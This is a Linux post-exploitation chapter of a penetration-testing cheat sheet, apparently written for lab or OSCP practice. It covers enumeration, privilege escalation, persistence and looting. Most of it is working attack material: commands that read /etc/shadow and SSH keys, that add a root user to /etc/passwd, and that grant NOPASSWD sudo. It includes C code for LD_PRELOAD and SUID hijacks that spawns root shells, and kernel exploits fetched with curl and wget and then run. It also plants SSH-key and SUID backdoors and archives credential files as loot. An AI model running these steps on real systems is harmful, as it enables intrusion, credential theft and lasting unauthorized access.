
# 6 Linux

## 6.1 Basic Linux Post-Exploit Enumeration

Before you run basic enumeration, [upgrade to an interactive shell](#4.4.3%20Upgrading%20to%20Interactive%20Shell)

```sh
# minimum commands
id
uname -a
cat /etc/*release
env                # or 'set'
ps -ef wwf
ip a               # or ifconfig -a
ss -untap          # or 'netstat -untap'
w
last


###############################
## SELF  ######################
###############################

# current user
id
whoami

# check sudo permissions
sudo -l
# take advantage of every permission you have!

# environment
(env || set) 2>/dev/null


###############################
## HOST  ######################
###############################

# hostname
hostname
hostname -A  # Linux - also shows all FQDNs
hostname -f  # BSD,Mac - show FQDN
cat /etc/hostname

# OS Version info
(cat /proc/version || uname -a ) 2>/dev/null
cat /etc/*release
cat /etc/issue
# look for kernel version exploits


###############################
## USERS  #####################
###############################

# list all users, groups
cat /etc/passwd
cat /etc/group
grep -vE "nologin|false" /etc/passwd
cat /etc/master.passwd
cat /etc/shadow  # need to be root, get list of hashed passwords
# pretty print relevant data
grep -v '#' /etc/passwd | awk -F: 'BEGIN{print "USERNAME PASSWD UID GID HOMEDIR SHELL"; print "-------- ------ --- --- ------- -----"} {print $1 " " $2 " " $3 " " $4 " " $6 " " $7}' | column -t

# Currently signed in users
w
who -a

# Recently signed in users
last  # better info running as root, may need "-a" switch


###############################
## NETWORK  ###################
###############################

# IP addresses, interfaces
ip a
ifconfig -a
cat /etc/network/interfaces
# check that you're on the box you expect
# look for pivots into other networks
# look for signs of virtualization, containers, antivirus

# Routing info
ip r
route -n
routel
netstat -r

# arp table
ip n
arp -a

# Network connections
# when commands run as root, get process info for all users
# when run as user, only see owned process information
ss -untap # Linux, all tcp/udp ports w/ pids
netstat -untap  # Old linux, all tcp/udp ports w/ pids
netstat -nvf inet # Mac
lsof -Pni  # established connections
fuser -n tcp PORTNUM # who is using port?
# advanced, as root: data under /proc/net/

# known hosts
cat /etc/hosts

# iptables rules
cat /etc/iptables/rules.v4 # Debian,Ubuntu
cat /etc/sysconfig/iptables # RHEL,CentOS,Fedora
cat /etc/iptables/rules.v6 # Debian,Ubuntu
cat /etc/sysconfig/ip6tables # RHEL,CentOS,Fedora
# must be root to run 'iptables'
iptables -L -v -n
iptables -t nat -L -v -n  # NAT info
iptables-save  # saved iptables

# DNS resolver info
cat /etc/resolv.conf

# if you have sudo permissions for tcpdump,
# privesc with it (it's a GTFOBin).
# Also, sniff for plaintext creds:
sudo tcpdump -i lo -A | grep -i "pass"


###############################
## PROCESSES  #################
###############################

# running processes
ps -ef wwf
# look for unusual processes
# or processes running as root that shouldn't be

# view all cron scripts
ls -lah /etc/cron*
# look at system-wide crontab
cat /etc/crontab
# pay attention to PATH in /etc/crontab and any bad file perms of scripts

# check this user's cron jobs
crontab -l

# check for running cron jobs
grep "CRON" /var/log/syslog
grep "CRON" /var/log/cron.log

# list every user's cron jobs
for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l; done 2>/dev/null


###############################
## FILESYSTEM  ################
###############################

# mounted filesystems
mount
cat /etc/fstab
cat /etc/auto?master
df -h # disk stats
lsblk # available disks
# unmounted partitions may have juicy files on them
# look for credentials in /etc/fstab or /etc/auto*

# find all SUID and SGID binaries
find / -type f \( -perm -u+s -o -perm -g+s \) -executable -ls 2> /dev/null
find / -type f \( -perm -u+s -o -perm -g+s \) -perm -o+x -ls 2> /dev/null

# list writable directories in PATH
# bash, sh:
( set -o noglob; IFS=:;for p in $PATH; do [ -w "$p" ] && ls -ald $p; done )
# zsh:
( set -o noglob; IFS=:; for p in ($(echo $PATH)); do [ -w "$p" ] && ls -ald $p; done )

# find world-writable files and directories
find / \( -path /sys -o -path /proc -o -path /dev \) -prune -o -perm -o+w -type d -ls 2>/dev/null
find / \( -path /sys -o -path /proc -o -path /dev \) -prune -o -perm -o+w -type f -ls 2>/dev/null
# to limit search to current file system mount, use -mount or -xdev

# find directories/files _this user_ can write to, not owned by me
find / \( -path /sys -o -path /proc \) -prune -o -writable -type d -not -user "$(whoami)" -ls 2>/dev/null
find / \( -path /sys -o -path /proc \) -prune -o -perm -o+w -type d -not -user "$(whoami)" -ls 2>/dev/null
find / \( -path /sys -o -path /proc \) -prune -o -writable -type f -not -user "$(whoami)" -ls 2>/dev/null

# check Capabilities of files
# look for GTFOBins that have cap_setuid+ep (effective, permitted)
/usr/sbin/getcap -r / 2>/dev/null | grep cap_setuid

# shell history
cat /home/*/.*history
grep -E 'telnet|ssh|mysql' /home/*/.*history 2>/dev/null

# credential files
ls -l /home/*/.ssh/id_*  # ssh keys
ls -AlR /home/*/.gnupg  # PGP keys
ls -l /tmp/krb5*  # Kerberos tickets
find / -type f -name *.gpg
find / -type f -name id_*



###############################
## SOFTWARE  ##################
###############################

# Info on installed packages
dpkg -l  # Debian
rpm -qa --last  # RedHat
yum list | grep installed  # CentOS/RedHat w/ Yum
apt list --installed  # Debain w/ Apt
pkg_info  # xBSD
pkginfo  # Solaris
ls -d /var/db/pkg/  # Gentoo
pacman -Q  # Arch
cat /etc/apt/sources.list  # Apt sources
ls -l /etc/yum.repos.d/  # Yum repos
cat /etc/yum.conf  # Yum config

# Kernel modules
lsmod # list loaded modules
/sbin/modinfo MODULENAME # get info on module

# check version info of useful binaries
gcc -v  # compiler
ldd --version  # glibc version
python --version
python3 --version
perl -v
php -v
ruby -v
node -v
mysql --version

# See if other useful GTFO-bins are present
which awk base64 curl dd gdb gzip less lua nano nmap nohup openssl rsync scp ssh screen sed socat tar tmux vi vim wget xxd xz zip


##################################
## VULNERABILITIES  ##############
##################################

# check for CVE-2021-3156 (sudoedit heap-based buffer overflow, privesc)
# *check only works if you are in sudoers file. Affects all legacy versions
# from 1.8.2 to 1.8.31p2 and all stable versions from 1.9.0 to 1.9.5p1.
# Exploit works even if user isn't in sudoers file.
sudoedit -s /
# Vulnerable if it says 'sudoedit: /: not a regular file' instead of 'usage:...'
# use exploit: https://github.com/CptGibbon/CVE-2021-3156.git

# check sudo version
sudo -V
# if older than 1.8.28, root privesc:
sudo -u#-1 /bin/bash
# or sudo -u \#$((0xffffffff)) /bin/bash


# check for pwnkit (look for version < 0.120)
/usr/bin/pkexec --version


####################################
## MISCELLANEOUS  ##################
####################################

# kernel system messages since boot
dmesg

# processor and memory info
cat /proc/cpuinfo
cat /proc/meminfo

# Message of the Day
cat /etc/motd

# Get SELinux status
getenforce
```

### 6.1.1 Watching for Linux Process Changes

```sh
#!/bin/bash
# source: Ippsec nineveh walkthrough

# Loop by line
IFS=$'\n'

old_process=$(ps aux --forest | grep -v "ps aux --forest" | grep -v "sleep 1" | grep -v $0)

while true; do
  new_process=$(ps aux --forest | grep -v "ps aux --forest" | grep -v "sleep 1" | grep -v $0)
  diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]
  sleep 1
  old_process=$new_process
done
```

Also check out [pspy](https://github.com/DominicBreuker/pspy)


## 6.2 Linux Privilege Escalation

So many options:
- [PayloadsAllTheThings - Linux Privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [HackTricks - Linux Privesc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)


### 6.2.1 Abusing `sudo`

[Many binaries](https://gtfobins.github.io/#+sudo) let you run commands from within them. If you get limited `sudo`
permissions for one of the binaries, you can escalate to root.

> ⚠ **NOTE**: If you get "Permission denied" error, check `/var/log/syslog` to see if the `audit` daemon is blocking you with `AppArmor` (enabled by default on Debian 10).

```sh
# check for sudo permissions
sudo -l
# if you see a binary with '(root) NOPASSWD ...' you might be in luck
# check the following website for escalation methods:
# https://gtfobins.github.io/#+sudo

# Example: awk
sudo awk 'BEGIN {system("/bin/sh")}'

# Example: find
sudo find . -exec /bin/sh \; -quit
```

### 6.2.2 Adding root user to /etc/shadow or /etc/passwd

```sh
# if /etc/shadow is writable
# generate new password
openssl passwd -6 herpderp
# or
mkpasswd -m sha-512 herpderp
# edit /etc/shadow and overwrite hash of root with this one

# if /etc/passwd is writable
echo "derp:$(openssl passwd -6 herpderp):0:0:root:/root:/bin/bash" >> /etc/passwd
# alternatively
echo "derp:$(mkpasswd -m sha-512 herpderp):0:0:root:/root:/bin/bash" >> /etc/passwd
# pre-computed for password 'herpderp':
echo 'derp:$5$herpderp$pkbOJ3TJ8UP4oCW0.B5bzt3vNeHCXClgwE2efw60p.6:0:0:root:/root:/bin/bash' >> /etc/passwd

# the empty/blank crypt hash for old Linux systems is U6aMy0wojraho.
# if you see this in an /etc/passwd (or shadow), the user has no password!

# can also add generated password between the first and second colon of root user
```

### 6.2.3 Grant passwordless sudo access

Edit the `/etc/sudoers` file to have the following line:

```
myuser ALL=(ALL) NOPASSWD: ALL
```

### 6.2.4 LD_PRELOAD and LD_LIBRARY_PATH

For this to work, `sudo -l` must show that either LD_PRELOAD or LD_LIBRARY_PATH
are inherited from the user's environment:
```
env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
```

`preload.c`:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#define _GNU_SOURCE
#include <unistd.h>

void _init() {
	unsetenv("LD_PRELOAD");
	// setresuid(0,0,0);
  setuid(0);
  setgid(0);
	system("/bin/bash -p");
  exit(0);
}
```

`library_path.c`:
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
  exit(0);
}
```

Usage:

```sh
# LD_PRELOAD
# compile malicious preload binary
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
# use it to get root
sudo LD_PRELOAD=/tmp/preload.so program_name_here

# LD_LIBRARY_PATH
# see which shared libraries are used
ldd $(which apache2)
# compile malicious library as one of existing ones
gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c
# use it to get root
sudo LD_LIBRARY_PATH=/tmp apache2
# note, some ld-files work better than others, so try every option from ldd
# if the first attempt fails. May also need to alter file to hook function
# being called (must exactly match function signature)
```

### 6.2.5 Hijacking SUID binaries

`inject.c`:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void inject() __attribute__((constructor));

void inject() {
	setuid(0);
  setgid(0);
	system("/bin/bash -p");
  exit(0);
}
```

```sh
# find all root-owned SUID and GUID binaries
find / -type f \( -perm -g+s -a -gid 0 \) -o \( -perm -u+s -a -uid 0 \) -ls 2>/dev/null

# look for access to shared object that doesn't exist, but we might control
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"

# compile your inject file
gcc -shared -fPIC inject.c -o /path/to/hijacked.so

# run your binary
suid-so
```

You can also hijack system(3) calls in an executable where the binary path isn't
specified (PATH hijack). Look for clues using `strings` and `strace`, then replace
the binary in question with your own:

`hijack.c`
```c
/* Gets root shell
 * Compile (as root):
 * gcc -Wall pwn.c -o pwn && chmod u+s pwn
 */
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main() {
	setuid(0);
	setgid(0);
	system("/bin/bash -p");
  return 0;
}
```

And invoke like so:
```sh
# compile
gcc hijack.c -o hijacked-binary-name

# inject onto PATH
PATH=.:$PATH victim-binary
```

In `bash` versions less than 4.2-048, you can even do PATH hijacks by exporting
functions that look like valid paths, and will get executed instead of the
binary at the real path:

```sh
# create a substitute for /usr/sbin/service
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
# then just run victim binary that executes /usr/sbin/service
```

For bash versions less than 4.4, you can also take advantage of the PS4 env var,
which is used to display debug information (debug mode when `SHELLOPTS=xtrace`).

```sh
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```

### 6.2.6 Using NFS for Privilege Escalation

NFS Shares inherit the **remote** user ID, so if root-squashing is disabled,
something owned by root remotely is owned by root locally.

```sh
# check for NFS with root-squashing disabled (no_root_squash)
cat /etc/exports

# On Kali box:
sudo su   # switch to root
mkdir /tmp/nfs
mount -o rw,nolock,vers=2 $VICTIM_IP:/share_name /tmp/nfs
# Note: if mount fails, try without vers=2 option.
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
chmod +xs /tmp/nfs/shell.elf

# on victim machine
/tmp/shell.elf
```

### 6.2.7 Using Docker for Privesc

This is possible when the user is a member of the `docker` group.

```sh
# mounts the root filesystem into the docker container, and
# starts an interactive docker shell
docker run --rm -it -v /:/mnt --privileged ubuntu bash
```

From there, add your ssh key to `/mnt/root/.ssh/authorized_keys` or update the
`/mnt/etc/passwd` file to include an additional malicious root user.

### 6.2.8 Linux Kernel Exploits

⚠ **NOTE**: Use LinPEAS to enumerate for kernel vulnerabilities. Searchsploit is often less effective.

#### 6.2.8.1 Dirty Cow

[CVE-2016-5195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2016-5195) is effective against Linux kernels 2.x through 4.x before 4.8.3.

```sh
# easiest if g++ avail
searchsploit -m 40847
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
./dcow -s

# Also good:
searchsploit -m 40839

# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
```


#### 6.2.8.2 PwnKit

[CVE-2021-4034](https://nvd.nist.gov/vuln/detail/cve-2021-4034) PwnKit is effective against many Linux variants:
- Ubuntu 10 - Ubuntu 21.10
- Debian 7 - Debian 11
- RedHat 6.0 - RedHat 8.4 (and similar Fedora & CentOS versions?)

Affects pkexec (polkit) < 0.120.

**Detailed vulnerable versions:**  [reference](https://www.datadoghq.com/blog/pwnkit-vulnerability-overview-and-remediation/)

Check what's installed with `dpkg -s policykit-1`

Ubuntu:

| Ubuntu version     | Latest vulnerable version | First fixed version         |
| ------------------ | ------------------------- | --------------------------- |
| 14.04 LTS (Trusty) | 0.105-4ubuntu3.14.04.6    | 0.105-4ubuntu3.14.04.6+esm1 |
| 16.04 LTS (Xenial) | 0.105-14.1ubuntu0.5       | 0.105-14.1ubuntu0.5+esm1    |
| 18.04 LTS (Bionic) | 0.105-20                  | 0.105-20ubuntu0.18.04.6     |
| 20.04 LTS (Focal)  | 0.105-26ubuntu1.1         | 0.105-26ubuntu1.2           |

Debian:

| Debian version | Latest vulnerable version | First fixed version |
| -------------- | ------------------------- | ------------------- |
| Stretch        | 0.105-18+deb9u1           | 0.105-18+deb9u2     |
| Buster         | 0.105-25                  | 0.105-25+deb10u1    |
| Bullseye       | 0.105-31                  | 0.105-31+deb11u1    |
| (unstable)     | 0.105-31.1~deb12u1        | 0.105-31.1          |

Checking for vulnerability:

```sh
# check suid bit set:
ls -l /usr/bin/pkexec

# check for vulnerable version (see above tables):
dpkg -s policykit-1
```

Exploit:

```sh
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o pwnkit
chmod +x ./pwnkit
./pwnkit # interactive shell
./pwnkit 'id' # single command
# it will tell you nicely if the exploit fails when the system is patched.
```


#### 6.2.8.3 Get-Rekt BPF Sign Extension LPE

[CVE-2017-16995](https://nvd.nist.gov/vuln/detail/CVE-2017-16995) is effective against Linux kernel 4.4.0 - 4.14.10.
- Debian 9
- Ubuntu 14.04 - 16.04
- Mint 17 - 18
- Fedora 25 - 27

```sh
# on kali, grab source
searchsploit -m 45010
python -m http.server 80

# on victim, download, compile, and execute
wget LISTEN_IP/45010.c -O cve-2017-16995
gcc cve-2017-16995.c -o cve-2017-16995
```


#### 6.2.8.4 Dirty Pipe

[CVE-2022-0847](https://nvd.nist.gov/vuln/detail/CVE-2022-0847) affects Linux kernels 5.8.x up. The vulnerability was fixed in Linux 5.16.11, 5.15.25 and 5.10.102.
- Ubuntu 20.04 - 21.04
- Debian 11
- RHEL 8.0 - 8.4
- Fedora 35

```sh
wget https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c
python -m http.server 80

# on victim
wget LISTEN_IP/exploit.c
gcc exploit.c -o exploit # may need to compile locally with "-static"
./exploit # if statically compiled, may complain about system() failing, but might be ok

# check if exploit worked
grep root /etc/passwd # should see hash with 'aaron' salt

# become r00t
su - # use password 'aaron'

# to restore to pre-exploit state
# if you get error "su: must be run from a terminal"
# or error "system() function call seems to have failed :("
# but the exploit successfully changed root's password in /etc/passwd
# - login as root with the password aaron.
# - restore /etc/passwd
mv /tmp/passwd.bak /etc/passwd
```



## 6.3 Linux Persistence

Many of the techniques for privilege escalation can be used to also maintain persistence (particularly ones where you modify a file).

### 6.3.1 Add SSH key to authorized_keys

You can add your key to either `root` or a user with (passwordless) sudo.

```sh
# on kali, make ssh key and copy it
ssh-keygen -C "derp" -N "" -f ./derp-ssh
xclip -sel clip derp-ssh.pub

# on victim (as root):
# make sure .ssh directory exists with right permissions
mkdir -pm700 /root/.ssh
# add key to authorized_keys
echo "PASTEYOURSSHPUBKEY" >> /root/.ssh/authorized_keys
```

### 6.3.2 Set SUID bit

If you set the SUID bit of a root-owned executable, like `/bin/sh` or `less`
or `find` (see [GTFOBins](https://gtfobins.github.io/#+shell) for more), you can use those to give yourself a root shell. This is a kind of privesc backdoor.

```sh
sudo chmod u+s /bin/sh
```


## 6.4 Miscellaneous Linux Commands

```sh
# make sure terminal environment is good, if not working right
export PATH='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
export TERM=xterm-256color
```


### 6.4.1 Awk & Sed

Sometimes there is a lot of extra garbage in the loot you grab. It's nice to
be able to quickly sift through it to get the parts you care about.

```sh
# grab lines of text between start and end delimiters.
awk '/PAT1/,/PAT2/' # includes start and end lines
awk '/PAT1/{flag=1; next} /PAT2/{flag=0} flag' FILE  # omits delims
sed -n '/PAT1/,/PAT2/{//!p;}' FILE
sed '/PAT1/,/PAT2/!d;//d' FILE
```

## 6.5 Linux Files of Interest

```sh
# quick command to grab the goods
tar zcf loot.tar.gz \
/etc/passwd{,-} \
/etc/shadow{,-} \
/etc/ssh/ssh_config \
/etc/ssh/sshd_config \
/home/*/.ssh/id_* \
/home/*/.ssh/authorized_keys* \
/home/*/.gnupg \
/root/.gnupg \
/root/.ssh/id_* \
/root/.ssh/authorized_keys* \
/root/network-secret*.txt \
/root/proof.txt
```
